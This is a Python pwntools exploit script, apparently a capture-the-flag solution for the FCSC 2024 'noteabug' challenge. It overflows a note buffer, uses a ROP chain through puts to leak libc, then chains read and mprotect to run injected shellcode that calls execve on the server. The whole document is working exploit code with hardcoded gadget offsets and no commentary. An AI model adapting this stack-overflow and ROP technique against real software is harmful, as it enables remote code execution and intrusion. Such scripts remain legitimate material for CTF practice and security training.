from pwn import *
from binascii import unhexlify

elf = ELF('./noteabug', checksec=False)
libc = elf.libc
context.arch = 'amd64'




p = remote("challenges.france-cybersecurity-challenge.fr", 2110)
#p = process(['/home/number/FCSC2024/Pwn/AD2/noteabug', '100'])


p.recvuntil(b"/fcsc/")
path = p.recvuntil(b"/")

info("path %s " % path.decode())


p.sendlineafter(b">>> ", b"1")

p.recvuntil(b"Creating note: ")
name = p.recvuntil(b"\nContent", drop=True)

info("name %s" % name.decode())

payload2 = b"A"*104
payload2 += p64(0x0000000000401016)
payload2 += p64(0x000000000040135e) # pop_rdi
payload2 += p64(elf.got.puts)
payload2 += p64(elf.plt.puts)
payload2 += p64(0x00401977)



p.recvuntil(b"length: \n")
p.sendline(str(len(payload2)+1).encode())
p.recvuntil(b"Content: \n")
pause()
p.sendline(payload2)


libc.address = u64(p.recvline().strip().ljust(8, b"\0")) - libc.sym.puts




info("libc 0x%hx" % libc.address)


# 0x000000000009a5b2 : mov rdi, rsi ; call rax
# 0x000000000003f117 : pop rax ; ret
# 0x00000000000270e2 : ret


pop_rdi  = 0x0000000000027765+libc.address # : pop rdi ; ret
ret        = 0x00000000000270e2 + libc.address
mov_rdi_rsi = 0x000000000009a5b2+libc.address
pop_rax = 0x000000000003f117 + libc.address
pop_rsi = 0x0000000000028f19 + libc.address #: pop rsi ; ret
mov_rax_rsi = 0x000000000009ed27 + libc.address
mov_rdx_rax =  0x000000000003532c+libc.address #: mov qword ptr [rdx], rax ; ret
pop_rdx = 0x00000000000fdcfd+libc.address # : pop rdx ; ret
libc_data = 0x1d21c8+libc.address
syscall_ret = 0x00121db7+libc.address


payload1 = b""
payload1 = payload1.ljust(104, b"A")
payload1 += p64(ret)
payload1 += p64(pop_rdi)
payload1 += p64(0)
payload1 += p64(pop_rsi)
payload1 += p64(libc_data)
payload1 += p64(pop_rdx)
payload1 += p64(0xffff)
payload1 += p64(elf.plt.read)
payload1 += p64(pop_rdi)
payload1 += p64(libc_data-456)
payload1 += p64(pop_rsi)
payload1 += p64(0x1000)
payload1 += p64(pop_rdx)
payload1 += p64(0x7)
payload1 += p64(libc.sym.mprotect)
payload1 += p64(libc_data)













print(len(payload1))



p.clean()
p.sendline(b"1")

p.recvuntil(b"length: \n")

p.sendline(str(len(payload1)+1).encode())
p.recvuntil(b"Content: \n")
pause()
p.sendline(payload1)

"""
0x404000 - 0x404040 -> /usr/bin
0x404008 - 0x404048 -> /ls
0x404010 - 0x404050 -> /fcsc/ZB
0x404018 - 0x404058 -> rKMnQJGe
0x404020 - 0x404060 -> btYHDXrN
0x404028 - 0x404068 -> xxF6hU2D
0x404030 - 0x404070 -> zwJzX
0x404038 - 0x0

"""

# write pointer
shellcode = ""
base = 0x404000
basew = 0x404040
content = ['/usr/bin', '/ls'.ljust(8, "\0"), '/fcsc/YA', 'u4kj47vb', 'SDkqTEf2', 'YttEcK88', 'pXYpf'.ljust(8, "\0")]

shellcode += "mov rax,0x%hx\n" % (base)
shellcode += "mov rcx,0x%hx\n" % (basew)
shellcode += "mov qword ptr [rax],rcx\n"
shellcode += "mov rax,0x%hx\n" % (base+8)
shellcode += "mov rcx,0x%hx\n" % (basew+0x10)
shellcode += "mov qword ptr [rax],rcx\n"

cnt = 0
for x in content:
    shellcode += "mov rax, 0x%hx\n" % (basew+8*cnt)
    shellcode += "mov rcx, %s\n" % hex(u64(x))
    shellcode += "mov qword ptr [rax], rcx\n"
    cnt += 1


shellcode += "mov rax, 0x3b\n"
shellcode += "mov rdi,%s\n" % (hex(basew))
shellcode += "mov rsi,%s\n" % (hex(base))
shellcode += "xor rdx,rdx\n"
shellcode += "syscall\n"






p.sendline(asm(shellcode))



p.interactive()
